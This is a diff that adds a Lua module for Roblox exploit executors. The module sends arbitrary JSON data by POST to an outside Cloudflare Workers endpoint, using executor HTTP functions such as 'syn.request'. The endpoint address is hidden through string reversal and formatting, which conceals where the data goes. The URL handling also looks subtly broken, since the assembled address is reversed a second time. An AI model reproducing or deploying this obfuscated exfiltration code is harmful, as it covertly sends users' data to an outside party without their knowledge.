@@ -1,1 +1,38 @@
-yes
+local httprequest = request or HttpPost or httprequest or http_request or (http and http.request) or (syn and syn.request) or function(...)
+	return false
+end
+
+local reverse = string.reverse
+local format = string.format
+
+local HttpService = game:GetService("HttpService")
+local WORKER_URL = "https://" .. format("se%sce.", "rvi") .. reverse("otelokin") .. ".workers.dev" .. reverse(format("%sabmoc", "cct"))
+
+local function SendData(BodyData)
+    local Success, Encoded = pcall(function()
+        return HttpService:JSONEncode(BodyData)
+    end)
+
+    if not Success then
+        warn("[Service Error] Failed to encode JSON.")
+        return
+    end
+
+    local REAL_WORKER_URL = reverse(WORKER_URL)
+    local Response = httprequest({
+        Url = REAL_WORKER_URL,
+        Body = Encoded,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+    })
+
+    if not Response then
+        warn("[Service Error] No response / httprequest blocked.")
+        return
+    end
+
+    warn("[Service Info] Sent data with response code: " .. tostring(Response.StatusCode))
+end
+return SendData
